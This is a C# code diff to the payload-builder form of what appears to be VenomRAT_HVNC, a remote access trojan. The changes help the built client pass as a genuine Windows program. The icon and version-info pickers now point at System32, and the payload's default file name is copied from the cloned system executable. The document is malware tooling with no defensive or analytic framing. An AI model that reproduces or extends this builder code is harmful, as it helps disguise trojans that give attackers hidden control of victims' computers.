@@ -22,6 +22,7 @@ namespace VenomRAT_HVNC.Server.Forms
 {
     public partial class FormBuilder
     {
+        public static string FileNameAssembly;
         public FormBuilder()
         {
             InitializeComponent();
@@ -191,7 +192,7 @@ namespace VenomRAT_HVNC.Server.Forms
             textIP.Clear();
         }
 
-        private async void BtnBuild_Click(object sender, EventArgs e)
+        private async void  BtnBuild_Click(object sender, EventArgs e)
         {
             if ((chkPaste_bin.Checked || YourListIPs.Items.Count != 0) && YourListPorts.Items.Count != 0)
             {
@@ -223,9 +224,16 @@ namespace VenomRAT_HVNC.Server.Forms
                         module = ModuleDefMD.Load(File.ReadAllBytes("Stub/Client.exe"));
                         using SaveFileDialog saveFileDialog = new SaveFileDialog();
                         saveFileDialog.Filter = @".exe (*.exe)|*.exe";
-                        saveFileDialog.InitialDirectory = Application.StartupPath;
+                        saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                         saveFileDialog.OverwritePrompt = false;
-                        saveFileDialog.FileName = "Protected";
+                        if (!string.IsNullOrEmpty(FileNameAssembly))
+                        {
+                            saveFileDialog.FileName = FileNameAssembly;
+                        }
+                        else
+                        {
+                            saveFileDialog.FileName = "ProtectedClient";
+                        }
                         if (saveFileDialog.ShowDialog() == DialogResult.OK)
                         {
                             btnBuild.Enabled = false;
@@ -251,6 +259,7 @@ namespace VenomRAT_HVNC.Server.Forms
                             {
                                 IconInjector.InjectIcon(saveFileDialog.FileName, txtIcon.Text);
                             }
+                            
 
                             try
                             {
@@ -348,6 +357,7 @@ namespace VenomRAT_HVNC.Server.Forms
                 openFileDialog.Title = @"Choose Icon";
                 openFileDialog.Filter = @"Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                 openFileDialog.Multiselect = false;
+                openFileDialog.InitialDirectory = @"C:\Windows\System32";
                 if (openFileDialog.ShowDialog() == DialogResult.OK)
                 {
                     if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
@@ -567,6 +577,7 @@ namespace VenomRAT_HVNC.Server.Forms
             using (OpenFileDialog openFileDialog = new OpenFileDialog())
             {
                 openFileDialog.Filter = @"Executable (*.exe)|*.exe";
+                openFileDialog.InitialDirectory = @"C:\Windows\System32";
                 if (openFileDialog.ShowDialog() == DialogResult.OK)
                 {
                     FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
@@ -598,6 +609,8 @@ namespace VenomRAT_HVNC.Server.Forms
                         versionInfo.FilePrivatePart.ToString()
                     });
                 }
+
+                FileNameAssembly = Path.GetFileName(openFileDialog.FileName);
             }
         }
 
